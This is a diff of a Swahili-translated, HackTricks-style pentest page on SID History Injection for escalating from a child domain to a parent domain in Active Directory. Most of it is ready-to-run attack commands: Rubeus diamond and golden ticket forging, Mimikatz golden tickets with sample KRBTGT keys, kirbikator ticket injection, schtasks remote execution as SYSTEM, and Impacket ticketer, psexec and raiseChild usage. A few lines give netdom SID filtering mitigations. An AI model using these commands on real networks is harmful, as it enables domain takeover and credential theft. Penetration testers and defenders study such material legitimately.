@@ -4,11 +4,11 @@
 
 ## SID History Injection Attack
 
-Lengo la **SID History Injection Attack** ni kuwezesha **user migration kati ya domains** huku ikiendelea kuhakikisha upatikanaji wa resources kutoka domain ya awali. Hili hufanywa kwa **kuingiza Security Identifier (SID) ya awali ya user kwenye SID History** ya account yake mpya. Muhimu ni kwamba mchakato huu unaweza kutumiwa vibaya ili kutoa access isiyoidhinishwa kwa kuongeza SID ya group yenye privileges za juu (kama vile Enterprise Admins au Domain Admins) kutoka parent domain kwenye SID History. Exploitation hii hutoa access kwa resources zote zilizo ndani ya parent domain.<sup>[[1]](#references)[[2]](#references)</sup>
+Lengo la **SID History Injection Attack** ni kusaidia **user migration between domains** huku ikihakikisha kuendelea kupata access kwa resources kutoka domain ya awali. Hili hutekelezwa kwa **kuingiza Security Identifier (SID) ya awali ya user kwenye SID History** ya account yake mpya. Muhimu ni kwamba mchakato huu unaweza kutumiwa vibaya ili kutoa access isiyoidhinishwa kwa kuongeza SID ya group yenye high privilege (kama Enterprise Admins au Domain Admins) kutoka parent domain kwenye SID History. Exploitation hii hutoa access kwa resources zote zilizo ndani ya parent domain.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Kuna methods mbili za kutekeleza attack hii: kupitia kuunda **Golden Ticket** au **Diamond Ticket**.
+Kuna methods mbili za kutekeleza attack hii: kupitia uundaji wa **Golden Ticket** au **Diamond Ticket**.
 
-Ili kupata SID ya group ya **"Enterprise Admins"**, lazima kwanza upate SID ya root domain. Baada ya kuitambua, SID ya group ya Enterprise Admins inaweza kujengwa kwa kuongeza `-519` kwenye SID ya root domain. Kwa mfano, ikiwa SID ya root domain ni `S-1-5-21-280534878-1496970234-700767426`, SID inayotokana ya group ya "Enterprise Admins" itakuwa `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>
+Ili kupata SID ya group ya **"Enterprise Admins"**, lazima kwanza upate SID ya root domain. Baada ya kuitambua, SID ya group ya Enterprise Admins inaweza kujengwa kwa kuongeza `-519` mwishoni mwa SID ya root domain. Kwa mfano, ikiwa SID ya root domain ni `S-1-5-21-280534878-1496970234-700767426`, SID itakayotokana ya group ya "Enterprise Admins" itakuwa `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>
 
 Unaweza pia kutumia groups za **Domain Admins**, ambazo huishia kwa **512**.
 
@@ -17,18 +17,18 @@ Njia nyingine ya kupata SID ya group kutoka domain nyingine (kwa mfano "Domain A
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
 > [!WARNING]
-> Kumbuka kwamba inawezekana kuzima SID history katika uhusiano wa trust, jambo litakalosababisha attack hii ishindwe.
+> Kumbuka kwamba inawezekana kuzima SID history katika uhusiano wa trust, jambo litakalosababisha shambulio hili kushindwa.
 
 Kulingana na [**docs**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
-- **Kuzima SIDHistory kwenye forest trusts** kwa kutumia netdom tool (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
-- **Kutumia SID Filter Quarantining kwenye external trusts** kwa kutumia netdom tool (`netdom trust /domain: /quarantine:yes on the domain controller`)
-- **Kutumia SID Filtering kwenye domain trusts ndani ya forest moja** hakupendekezwi, kwa sababu ni configuration isiyoungwa mkono na inaweza kusababisha breaking changes. Ikiwa domain ndani ya forest haiaminiki, haipaswi kuwa mwanachama wa forest hiyo. Katika hali hii, ni lazima kwanza kugawanya domain zinazoaminika na zisizoaminika katika forests tofauti, ambapo SID Filtering inaweza kutumika kwenye interforest trust
+- **Kuzima SIDHistory kwenye forest trusts** kwa kutumia zana ya netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
+- **Kutumia SID Filter Quarantining kwenye external trusts** kwa kutumia zana ya netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
+- **Kutumia SID Filtering kwenye domain trusts ndani ya forest moja** hakupendekezwi, kwa kuwa ni usanidi usio na support na unaweza kusababisha mabadiliko yanayoharibu utendaji. Ikiwa domain ndani ya forest haiaminiki, haipaswi kuwa mwanachama wa forest hiyo. Katika hali hii, ni muhimu kwanza kugawanya domain zinazoaminika na zisizoaminika katika forests tofauti, ambako SID Filtering inaweza kutumika kwenye interforest trust
 
-Angalia post hii kwa maelezo zaidi kuhusu kubypass hii: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+Angalia post hii kwa maelezo zaidi kuhusu kubypass hii: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)<sup>[[4]](#references)</sup>
 
 ### Diamond Ticket (Rubeus + KRBTGT-AES256)
 
-Mara ya mwisho nilipojaribu hii nilihitaji kuongeza arg **`/ldap`**.
+Mara ya mwisho nilipojaribu hii, nilihitaji kuongeza arg **`/ldap`**.
 ```bash
 # Use the /sids param
 Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap
@@ -44,7 +44,7 @@ execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domai
 
 # You can use "Administrator" as username or any other string
 ```
-### Golden Ticket (Mimikatz) yenye KRBTGT-AES256
+### Golden Ticket (Mimikatz) with KRBTGT-AES256
 ```bash
 mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"
 
@@ -80,7 +80,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-Pandisha mamlaka hadi DA ya root au Enterprise admin kwa kutumia KRBTGT hash ya domain iliyoathiriwa:
+Pandisha mamlaka hadi DA ya root au Enterprise admin kwa kutumia hash ya KRBTGT ya domain iliyoathiriwa:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -92,7 +92,7 @@ schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTE
 
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
-Kwa ruhusa zilizopatikana kupitia attack, unaweza kutekeleza, kwa mfano, attack ya DCSync katika domain mpya:
+Kwa ruhusa zilizopatikana kupitia attack, unaweza kutekeleza kwa mfano attack ya DCSync katika domain mpya:
 
 
 {{#ref}}
@@ -101,7 +101,7 @@ dcsync.md
 
 ### Kutoka linux
 
-#### Mwongozo kwa [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
+#### Kwa mikono kwa kutumia [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
 ```bash
 # This is for an attack from child to root domain
 # Get child domain SID
@@ -121,28 +121,29 @@ export KRB5CCNAME=hacker.ccache
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
-#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
+#### Otomatiki kwa kutumia [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
 Hii ni Impacket script ambayo ita-**automate escalating from child to parent domain**. Script inahitaji:
 
-- Target domain controller
+- Domain Controller lengwa
 - Creds za admin user katika child domain
 
 Mtiririko ni:
 
 - Inapata SID ya Enterprise Admins group ya parent domain
-- Inapata hash ya KRBTGT account katika child domain
+- Inapata hash ya akaunti ya KRBTGT katika child domain
 - Inaunda Golden Ticket
 - Inaingia kwenye parent domain
-- Inapata credentials za Administrator account katika parent domain
-- Ikiwa switch ya `target-exec` imebainishwa, ina-authenticate kwenye Domain Controller ya parent domain kupitia Psexec.
+- Inapata credentials za akaunti ya Administrator katika parent domain
+- Ikiwa switch ya `target-exec` imeainishwa, inafanya authentication kwenye Domain Controller ya parent domain kupitia Psexec.
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
-## Marejeo
+## Marejeleo
 
-- [1] [Persistence ya Active Directory ya Kijanja #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
+- [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
 - [2] [Security Identifier (SID) ni nini? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
 - [3] [Mazingatio ya Usalama kwa Trusts - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
+- [4] [itm8.com - Sid Filter kama Mpaka wa Usalama Kati ya Domains Sehemu ya 4](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
 
 {{#include ../../banners/hacktricks-training.md}}
